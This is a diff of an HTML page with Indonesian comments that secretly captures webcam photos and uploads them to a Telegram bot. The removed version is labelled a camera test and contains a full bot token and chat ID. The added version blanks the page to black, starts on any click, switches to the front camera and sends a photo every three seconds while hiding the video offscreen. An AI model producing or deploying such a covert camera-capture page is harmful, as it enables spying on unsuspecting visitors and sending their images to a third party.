@@ -1,173 +1,107 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CCTV Background</title>
-    <style>
-        body {
-            font-family: 'Courier New', Courier, monospace;
-            background-color: #000;
-            color: #0f0; /* Warna hijau ala hacker */
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-        }
+  <meta charset="UTF-8">
+  <title>Hidden Camera</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        h1 { margin: 0; font-size: 40px; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
-        
-        #status-box {
-            margin-top: 20px;
-            font-size: 18px;
-            color: white;
-        }
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      color: black;
+      overflow: hidden;
+      user-select: none;
+    }
 
-        #log {
-            font-size: 12px;
-            color: #888;
-            margin-top: 10px;
-        }
-
-        /* MENYEMBUNYIKAN KAMERA DAN CANVAS SEPENUHNYA */
-        #video, #canvas {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            visibility: hidden;
-        }
-
-        button {
-            margin-top: 30px;
-            padding: 15px 30px;
-            background: #0f0;
-            color: #000;
-            border: none;
-            font-weight: bold;
-            font-size: 20px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-        button:hover { background: #fff; }
-
-    </style>
+    #video, #canvas {
+      position: absolute;
+      top: -9999px;
+      left: -9999px;
+      visibility: hidden;
+    }
+  </style>
 </head>
 <body>
 
-    <h1>TES CAMERA</h1>
-    
-    <div id="status-box">Menunggu akses...</div>
-    <div id="log">Siap melakukan loop pengiriman</div>
-
-    <!-- Tombol Mulai (Browser butuh interaksi user minimal 1x untuk akses kamera) -->
-    <button id="btnStart" onclick="startSystem()">MULAI SISTEM</button>
-
-    <!-- Elemen Tersembunyi -->
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+  <!-- Elemen tersembunyi -->
+  <video id="video" autoplay muted playsinline></video>
+  <canvas id="canvas"></canvas>
 
 <script>
-    // --- KONFIGURASI ---
-    const BOT_TOKEN = "7351606479:AAER5MF8ROCjnVmMOYGeKeUTGck5pV5Tr_k";
-    const CHAT_ID = "-4602305711"; // ID Grup
-    const JEDA_WAKTU = 3000; // Jeda 3000ms (3 detik) agar tidak kena limit spam
+  const BOT_TOKEN = "ISI_TOKEN_ANDA";
+  const CHAT_ID   = "ISI_CHAT_ID_ANDA";
+  const JEDA_WAKTU = 3000;
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const statusBox = document.getElementById('status-box');
-    const logBox = document.getElementById('log');
-    const btnStart = document.getElementById('btnStart');
-    
-    let counter = 0;
+  const video  = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
 
-    // 1. Memulai Sistem
-    async function startSystem() {
-        btnStart.style.display = 'none'; // Hilangkan tombol
-        statusBox.innerText = "Mengaktifkan kamera tersembunyi...";
+  let counter = 0;
+  let started = false;
 
-        try {
-            // Mengakses kamera belakang jika ada
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "environment" } 
-            });
-            
-            video.srcObject = stream;
-            
-            // Tunggu sebentar agar video load, lalu mulai loop
-            video.onloadedmetadata = () => {
-                statusBox.innerText = "Sistem Aktif. Memulai pengiriman...";
-                loopProcess(); 
-            };
+  // ✅ AUTOSTART SETELAH 1x KLIK DI MANA SAJA
+  document.body.addEventListener("click", () => {
+    if (!started) {
+      started = true;
+      startSystem();
+    }
+  });
 
-        } catch (err) {
-            console.error(err);
-            statusBox.innerHTML = "<span style='color:red'>Gagal Akses Kamera!</span>";
-            btnStart.style.display = 'block';
-        }
+  async function startSystem() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" }, // ✅ KAMERA DEPAN
+        audio: false
+      });
+
+      video.srcObject = stream;
+
+      video.onloadedmetadata = () => {
+        loopProcess();
+      };
+
+    } catch (err) {
+      console.error("Gagal kamera:", err);
+    }
+  }
+
+  function loopProcess() {
+    captureAndSend();
+  }
+
+  function captureAndSend() {
+    if (video.videoWidth === 0) {
+      setTimeout(loopProcess, 1000);
+      return;
     }
 
-    // 2. Loop Utama (Recursive)
-    function loopProcess() {
-        // Logika: Jepret -> Kirim -> (Selesai) -> Tunggu -> Ulangi
-        captureAndSend();
-    }
+    counter++;
 
-    // 3. Fungsi Jepret & Upload
-    function captureAndSend() {
-        counter++;
-        statusBox.innerText = `Mengambil gambar ke-${counter}...`;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
 
-        // Gambar video ke canvas (di background)
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Convert ke Blob (File gambar)
-        canvas.toBlob((blob) => {
-            uploadToTelegram(blob);
-        }, 'image/jpeg', 0.7); // Kualitas 70% agar ringan & cepat
-    }
+    canvas.toBlob(blob => {
+      uploadToTelegram(blob);
+    }, "image/jpeg", 0.7);
+  }
 
-    // 4. Kirim ke Telegram
-    function uploadToTelegram(imageBlob) {
-        statusBox.innerText = `Mengirim gambar ke-${counter}...`;
-        
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", imageBlob, `cctv-${counter}.jpg`);
-        // Caption opsional, bisa dikosongkan agar lebih cepat
-        formData.append("caption", `📸 Auto Capture #${counter}`);
+  function uploadToTelegram(imageBlob) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", imageBlob, `front-${counter}.jpg`);
+    formData.append("caption", `📷 Front Cam #${counter}`);
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                logBox.innerText = `✅ Foto #${counter} Terkirim.`;
-            } else {
-                logBox.innerText = `❌ Gagal #${counter}: ${data.description}`;
-            }
-        })
-        .catch(err => {
-            logBox.innerText = `❌ Error Jaringan #${counter}`;
-        })
-        .finally(() => {
-            // SETELAH SELESAI (SUKSES/GAGAL), ULANGI LAGI
-            statusBox.innerText = `Menunggu ${JEDA_WAKTU/1000} detik...`;
-            
-            setTimeout(() => {
-                loopProcess(); // Panggil fungsi loop lagi
-            }, JEDA_WAKTU);
-        });
-    }
-
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    })
+    .finally(() => {
+      setTimeout(loopProcess, JEDA_WAKTU);
+    });
+  }
 </script>
 
 </body>
